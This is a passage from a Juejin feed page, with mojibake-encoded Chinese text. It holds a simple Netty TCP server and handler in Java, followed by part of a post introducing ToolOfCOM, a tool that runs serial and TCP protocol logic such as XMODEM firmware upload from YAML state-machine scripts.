12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.ruyuan.netty;

<span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;
<span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringDecoder;
<span class="hljs-keyword">import</span> io.netty.handler.codec.string.StringEncoder;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyServer</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">NettyServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// è‚¯å®šéœ€è¦çº¿ç¨‹æ± ï¼Œæœ‰çš„çº¿ç¨‹å¯ä»¥å»è´Ÿè´£è·Ÿå¤§é‡çš„å®¢æˆ·ç«¯å»ºç«‹ç½‘ç»œè¿æ¥</span>
        <span class="hljs-comment">// æœ‰çš„çº¿ç¨‹å¯ä»¥å»è´Ÿè´£ç½‘ç»œioæ•°æ®è¯»å†™</span>
        <span class="hljs-comment">// ç½‘ç»œioæ•°æ®è¯»å–å‡ºæ¥ä»¥åï¼Œå¤„ç†è¯·æ±‚æ•°æ®ï¼Œæ•°æ®å¤„ç†ä¹Ÿéœ€è¦ä¸“é—¨çš„çº¿ç¨‹å»å¤„ç†</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>(); <span class="hljs-comment">// é»˜è®¤çš„çº¿ç¨‹æ± çš„å¤§å°ï¼Œcpu core * 2</span>
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>(<span class="hljs-number">20</span>);

        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">serverBootstrap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            serverBootstrap.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel socketChannel)</span> <span class="hljs-keyword">throws</span> Exception {
                            socketChannel.pipeline()
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringDecoder</span>())
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringEncoder</span>())
                                    .addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyServerHandler</span>());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">128</span>)
                    .childOption(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>);

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">channelFuture</span> <span class="hljs-operator">=</span> serverBootstrap.bind(port).sync();
            channelFuture.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"starting netty server......"</span>);
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8998</span>;
        <span class="hljs-keyword">if</span>(args.length &gt; <span class="hljs-number">0</span>) {
            port = Integer.parseInt(args[<span class="hljs-number">0</span>]);
        }
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyServer</span>(port).start();
    }

}

</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.ruyuan.netty;

<span class="hljs-keyword">import</span> io.netty.buffer.ByteBuf;
<span class="hljs-keyword">import</span> io.netty.buffer.Unpooled;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelHandlerContext;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInboundHandlerAdapter;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChannelInboundHandlerAdapter</span> {

    <span class="hljs-comment">// ç½‘ç»œè¿æ¥tcpä¸‰æ¬¡æ¡æ‰‹åï¼Œå»ºç«‹å’Œå°è£…ä¸€ä¸ªchannelï¼Œç½‘ç»œè¿æ¥çš„é€šä¿¡ç®¡é“</span>
    <span class="hljs-comment">// æ­¤æ—¶è¿™ä¸ªchannelåº”è¯¥å°±æ˜¯å¯ä»¥å®ç°ä¸€ä¸ªæ¿€æ´»</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelActive</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel active......"</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel read: "</span> + (String)msg);

        <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello world......"</span>;
        <span class="hljs-type">ByteBuf</span> <span class="hljs-variable">responseByteBuf</span> <span class="hljs-operator">=</span> Unpooled.buffer();
        responseByteBuf.writeBytes(response.getBytes());

        ctx.channel().writeAndFlush(responseByteBuf);
        System.out.println(<span class="hljs-string">"channel write: "</span> + response);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelReadComplete</span><span class="hljs-params">(ChannelHandlerContext ctx)</span> <span class="hljs-keyword">throws</span> Exception {
        System.out.println(<span class="hljs-string">"channel read complete......"</span>);
        ctx.flush();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        cause.printStackTrace();;
        ctx.close();
    }
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†]]></title>    <link>https://juejin.cn/post/7581073928715649058</link>    <guid>https://juejin.cn/post/7581073928715649058</guid>    <pubDate>2025-12-08T04:52:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581073928715649058" data-draft-id="7581041679189311523" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†"/> <meta itemprop="keywords" content="åµŒå…¥å¼"/> <meta itemprop="datePublished" content="2025-12-08T04:52:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="11cookies11"/> <meta itemprop="url" content="https://juejin.cn/user/1259367703787244"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æˆ‘åšäº†ä¸€ä¸ªç”¨ YAML æ¥é©±åŠ¨ä¸²å£/TCP åè®®æ‰§è¡Œçš„æ¡†æ¶ï¼Œä¸Šä½æœºä»æ­¤ä¸éœ€è¦å†™ä»£ç äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1259367703787244/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    11cookies11
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T04:52:45.000Z" title="Mon Dec 08 2025 04:52:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨åµŒå…¥å¼å¼€å‘ã€è‡ªåŠ¨åŒ–æµ‹è¯•ã€å·¥æ§è”è°ƒçš„ä¸–ç•Œé‡Œï¼Œæœ‰ä¸€ä¸ªæ°¸æ’çš„ç—›ç‚¹ï¼š</p>
<p><strong>åŒä¸€å¥—é€šä¿¡é€»è¾‘ï¼Œä¼šåœ¨ä¸åŒçš„å·¥å…·é‡Œè¢«åå¤å®ç°ã€‚</strong></p>
<ul>
<li>MCU Bootloader å‡çº§è¦å†™ä¸€å¥—ä¸Šä½æœº</li>
<li>Modbus è°ƒè¯•åˆå†™ä¸€å¥—</li>
<li>TCP æ§åˆ¶å°å†æ¥ä¸€å¥—</li>
<li>æµ‹è¯•å¹³å°è„šæœ¬è¿˜è¦é‡å†™ä¸€é</li>
</ul>
<p>åè®®æ²¡æœ‰å˜ï¼Œåªæ˜¯æ‰§è¡Œæ–¹å¼æ¢äº†ï¼Œäººå´ä¸€ç›´åœ¨é‡å¤åŠ³åŠ¨ã€‚</p>
<p>æˆ‘æ›¾ç»ä»¥ä¸ºè¿™æ˜¯æ­£å¸¸çš„ï¼Œç›´åˆ°æˆ‘å†™å‡ºäº†è¿™ä¸ªé¡¹ç›®ï¼š</p>
<pre><code class="hljs">ToolOfCOM
</code></pre>
<blockquote>
<p>ä¸€ä¸ªèƒ½â€œè¯»æ‡‚ YAML å¹¶æ‰§è¡Œé€šä¿¡åè®®é€»è¾‘â€çš„è¿è¡Œæ—¶ç³»ç»Ÿã€‚ ä½ ä¸å†éœ€è¦å†™ä¸Šä½æœºï¼Œå†™ä¸€ä»½ YAML å°±å¤Ÿäº†ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ğŸ§  ä¸ºä»€ä¹ˆä¼šæœ‰ ToolOfCOMï¼Ÿ</h2>
<p>æˆ‘ä»¬çœŸæ­£æƒ³è°ƒè¯•çš„ä¸æ˜¯â€œä¸²å£â€ï¼Œè€Œæ˜¯ï¼š</p>
<ul>
<li>ç­‰å¾…æŸä¸ªäº‹ä»¶</li>
<li>åˆ¤æ–­å›åŒ…å†…å®¹</li>
<li>è¶…æ—¶å¤„ç†</li>
<li>æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</li>
<li>åè®®å‡çº§è¿ç»­è¡Œä¸º</li>
</ul>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸Šä½æœºæ˜¯ä¸€å°<strong>é€šä¿¡çŠ¶æ€æœº</strong>ã€‚</p>
<p>ä»¥å‰æˆ‘ä»¬æŠŠçŠ¶æ€æœºç¡¬ç¼–ç åœ¨ Python / C# / LabVIEW é‡Œï¼Œæ‰€ä»¥ï¼š</p>
<blockquote>
<p>æ¯æ¢ä¸€ä¸ªåè®®ï¼Œä¹Ÿå°±æ¢äº†ä¸€å¥—ä¸Šä½æœºã€‚</p>
</blockquote>
<p>è¿™æ˜¯é‡å¤åŠ³åŠ¨çš„æ ¹æºã€‚</p>
<p>æˆ‘åœ¨ ToolOfCOM é‡Œåšäº†ä¸€ä»¶ç®€å•å´é¢ è¦†æ€§çš„äº‹ï¼š</p>
<h3 data-id="heading-1"><strong>æŠŠé€šä¿¡è¿‡ç¨‹æŠ½è±¡æˆ YAML DSL</strong></h3>
<p>åè®®åªæ˜¯ Driver é€šä¿¡åªæ˜¯ Channel æ‰§è¡Œè¿‡ç¨‹ç”±çŠ¶æ€æœºè§£é‡Š</p>
<p>äºæ˜¯é€šä¿¡é€»è¾‘ä»æ­¤å˜æˆäº†<strong>æ–‡æœ¬èµ„äº§</strong>ã€‚</p>
<h2 data-id="heading-2">ğŸš€ ç”¨ä¸€å¥è¯ç†è§£ ToolOfCOM</h2>
<blockquote>
<p><strong>å®ƒæ˜¯é€šä¿¡åè®®çš„è¿è¡Œæ—¶å¼•æ“ï¼Œ</strong> <strong>æŠŠä¸Šä½æœºå˜æˆå¯æ‰§è¡Œçš„ YAML çŠ¶æ€æœºã€‚</strong></p>
</blockquote>
<p>å’Œä¸²å£åŠ©æ‰‹ç­‰å·¥å…·çš„åŒºåˆ«åœ¨è¿™é‡Œï¼š</p>

















<table><thead><tr><th>å·¥å…·ç±»å‹</th><th>æ€ç»´æ¨¡å¼</th></tr></thead><tbody><tr><td>ä¼ ç»Ÿä¸Šä½æœº</td><td>â€œç‚¹æŒ‰é’® + å†™é€»è¾‘ + è°ƒä»£ç â€</td></tr><tr><td>ToolOfCOM</td><td>â€œå†™ YAML = å®šä¹‰åè®®æ‰§è¡Œé“¾â€</td></tr></tbody></table>
<p>ä¸æ˜¯æ›¿ä»£ï¼Œè€Œæ˜¯å‡ç»´ã€‚</p>
<h2 data-id="heading-3">ğŸ“ æ¶æ„é•¿è¿™æ ·ï¼ˆæç®€ä½†æœ‰æ€ä¼¤åŠ›ï¼‰</h2>
<pre><code class="hljs language-scss" lang="scss">YAML DSL
  â†“ parser
ScriptAST
  â†“ executor
Runtime Engine
  â”œâ”€ ActionRegistry
  â”œâ”€ Protocol Drivers (XMODEM / Modbus RTU/ASCII/TCP / YMODEM)
  â””â”€ Channels (UART / TCP / Logging)
</code></pre>
<p>ä¸€å¥è¯æ‹†è§£ï¼š</p>
<ul>
<li>YAML = é€šä¿¡æè¿°è¯­è¨€</li>
<li>Parser = æŠŠ YAML å˜æˆ AST</li>
<li>Runtime Engine = çŠ¶æ€æœºæ‰§è¡Œå™¨</li>
<li>Actions = å…·ä½“åŠ¨ä½œ</li>
<li>Drivers = åè®®æ ˆ</li>
<li>Channels = ä¸²å£/TCP æŠ½è±¡å±‚</li>
</ul>
<p><strong>åè®®ã€é€šé“ã€é€»è¾‘ä¸‰è€…å½»åº•è§£è€¦ã€‚</strong></p>
<h2 data-id="heading-4">ğŸ§¾ çœ‹çœ‹å®ƒçš„ YAMLï¼ˆæ¯” Python è¿˜é¡ºçœ¼ï¼‰</h2>
<p>è¿™æ˜¯ä¸€ä¸ªçœŸçš„å¯ä»¥æ‰§è¡Œçš„è„šæœ¬ï¼š</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">version:</span> <span class="hljs-number">1</span>
<span class="hljs-attr">vars:</span> { <span class="hljs-attr">block:</span> <span class="hljs-number">1</span>, <span class="hljs-attr">file_path:</span> <span class="hljs-string">./firmware.bin</span> }

<span class="hljs-attr">channels:</span>
  <span class="hljs-attr">boot:</span> { <span class="hljs-attr">type:</span> <span class="hljs-string">uart</span>, <span class="hljs-attr">device:</span> <span class="hljs-string">COM5</span>, <span class="hljs-attr">baudrate:</span> <span class="hljs-number">115200</span> }

<span class="hljs-attr">state_machine:</span>
  <span class="hljs-attr">initial:</span> <span class="hljs-string">wait_C</span>
  <span class="hljs-attr">states:</span>
    <span class="hljs-attr">wait_C:</span>
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">"C":</span> <span class="hljs-string">send_block</span> }
      <span class="hljs-attr">timeout:</span> <span class="hljs-number">5000</span>
      <span class="hljs-attr">on_timeout:</span> <span class="hljs-string">fail</span>

    <span class="hljs-attr">send_block:</span>
      <span class="hljs-attr">do:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-attr">action:</span> <span class="hljs-string">send_xmodem_block</span>
          <span class="hljs-attr">args:</span> { <span class="hljs-attr">block:</span> <span class="hljs-string">"$block"</span> }
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">ACK:</span> <span class="hljs-string">next_block</span>, <span class="hljs-attr">NAK:</span> <span class="hljs-string">send_block</span> }
      <span class="hljs-attr">timeout:</span> <span class="hljs-number">2000</span>
      <span class="hljs-attr">on_timeout:</span> <span class="hljs-string">fail</span>

    <span class="hljs-attr">next_block:</span>
      <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">set:</span> { <span class="hljs-attr">block:</span> <span class="hljs-string">"$block + 1"</span> } ]
      <span class="hljs-attr">when:</span> <span class="hljs-string">"$block &lt;= file.block_count"</span>
      <span class="hljs-attr">goto:</span> <span class="hljs-string">send_block</span>
      <span class="hljs-attr">else_goto:</span> <span class="hljs-string">send_eot</span>

    <span class="hljs-attr">send_eot:</span>
      <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">action:</span> <span class="hljs-string">send_eot</span> ]
      <span class="hljs-attr">on_event:</span> { <span class="hljs-attr">ACK:</span> <span class="hljs-string">done</span> }

    <span class="hljs-attr">done:</span> { <span class="hljs-attr">do:</span> [ <span class="hljs-bullet">-</span> <span class="hljs-attr">log:</span> <span class="hljs-string">"Completed"</span> ] }
</code></pre>
<p>è¿™ä¸æ˜¯é…ç½®æ–‡ä»¶ã€‚</p>
<p><strong>è¿™æ˜¯ä¸€æ®µå¯æ‰§è¡Œçš„é€šä¿¡æµç¨‹ä»£ç ã€‚</strong></p>
<h2 data-id="heading-5">ğŸ” å®ƒæ˜¯æ€ä¹ˆè·‘èµ·æ¥çš„ï¼Ÿ</h2>
<p>å®Œæ•´é“¾è·¯å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">toolofcom run upgrade.yaml
â†’ è§£æ YAML â†’ æ„å»ºçŠ¶æ€æœº â†’ åˆ›å»º UART/TCP é€šé“
â†’ æ³¨å†ŒåŠ¨ä½œ/åè®®é©±åŠ¨
â†’ æ‰§è¡Œ <span class="hljs-keyword">do</span> æŒ‡ä»¤ â†’ ç›‘å¬äº‹ä»¶/è¶…æ—¶
â†’ çŠ¶æ€è·³è½¬ â†’ å‘é€/æ”¶åŒ… â†’ å¾ªç¯æ‰§è¡Œ
â†’ done
</code></pre>
<p>æ‰§è¡Œæ—¥å¿—ä¼šå‘ˆç°æ¯ä¸€æ¬¡çŠ¶æ€è·³è½¬ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">STATE</span>] wait_C
waiting <span class="hljs-keyword">for</span> handshake...
[<span class="hljs-meta">STATE</span>] send_block
[<span class="hljs-meta">STATE</span>] next_block
...
Completed
</code></pre>
<p>å¦‚æœå¯ç”¨ LoggingChannelï¼Œè¿˜èƒ½æŠŠæ‰€æœ‰ TX/RX å¸§å†™å…¥æ—¥å¿—æ–‡ä»¶â€”â€”éå¸¸é€‚åˆè‡ªåŠ¨åŒ–æµ‹è¯•ä¸åè®®éªŒè¯ã€‚</p>
<h2 data-id="heading-6">âš¡ ä¸ºä»€ä¹ˆè¿™ä»¶äº‹æ„ä¹‰é‡å¤§ï¼Ÿ</h2>
<p>å› ä¸ºå®ƒæ”¹å˜äº†é€šä¿¡é€»è¾‘çš„ç”Ÿäº§æ–¹å¼ï¼š</p>






























<table><thead><tr><th>è§†è§’</th><th>è¿‡å»</th><th>ToolOfCOM</th></tr></thead><tbody><tr><td>åè®®æ¼”è¿›æˆæœ¬</td><td>æ”¹ä»£ç </td><td>æ”¹ YAML</td></tr><tr><td>æµ‹è¯•äººå‘˜</td><td>å­¦è„šæœ¬</td><td>å­¦çŠ¶æ€æœº</td></tr><tr><td>å·¥ç¨‹åä½œ</td><td>å‘å·¥å…·</td><td>å‘è„šæœ¬</td></tr><tr><td>åè®®èµ„äº§åŒ–</td><td>ä¸å­˜åœ¨</td><td>âœ” å®ç°</td></tr></tbody></table>
<p>æ›´å…³é”®çš„æ˜¯ï¼š</p>
<h3 data-id="heading-7"><strong>åŒä¸€ä»½ YAML å¯ä»¥åœ¨ä¸²å£ã€TCP ç­‰ä¸åŒé€šé“è¿è¡Œ</strong></h3>
<p>åè®®é€»è¾‘ç¬¬ä¸€æ¬¡å®ç°è·¨ä»‹è´¨å¤ç”¨ã€‚</p>
<h2 data-id="heading-8">ğŸ”¥ ç°å®ç”¨é€”æ˜¯ä»€ä¹ˆï¼Ÿ</h2>
<p>ToolOfCOM å·²ç»æ”¯æŒï¼š</p>





























